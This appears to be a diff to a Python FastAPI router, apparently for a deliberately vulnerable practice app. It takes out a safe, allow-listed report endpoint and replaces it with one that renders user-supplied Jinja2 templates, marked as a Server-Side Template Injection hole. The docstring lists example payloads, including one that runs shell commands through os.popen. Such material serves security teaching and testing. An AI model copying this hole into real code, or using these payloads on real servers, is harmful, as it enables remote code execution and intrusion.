@@ -6,6 +6,10 @@ from urllib.parse import urlparse
 import re
 import shlex
 import os
+try:
+    from jinja2 import Template
+except ImportError:
+    Template = None
 
 router = APIRouter()
 
@@ -123,18 +127,23 @@ def network_ping(payload: PingRequest):
 @router.post("/reports/generate")
 def generate_report(payload: ReportRequest):
     """
-    FIXED: Return report as plain text instead of rendering user-supplied templates.
-    Do not use Jinja2 Template rendering with user input.
+    VULNERABLE: Server-Side Template Injection (SSTI) via Jinja2
+    
+    The endpoint renders user-supplied template strings directly without sanitization.
+    This allows arbitrary code execution through Jinja2 template syntax.
+    
+    Example payloads:
+    - {{7*7}} → 49 (basic math)
+    - {{config}} → config object
+    - {{''.__class__.__mro__[1].__subclasses__()}} → List all classes
+    - {{self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
     """
     try:
-        # Safety: Build report from predefined templates only
-        if payload.template not in ['summary', 'detailed', 'executive']:
-            raise HTTPException(status_code=400, detail="Invalid template type")
+        from jinja2 import Template
         
-        # Generate safe report output
-        rendered = f"Report Type: {payload.template}\n"
-        rendered += f"Context: {payload.context}\n"
-        rendered += "Generated Report Content"
+        # VULNERABLE: Directly render user-supplied template
+        template = Template(payload.template)
+        rendered = template.render(**payload.context)
         
         return {
             "template": payload.template,
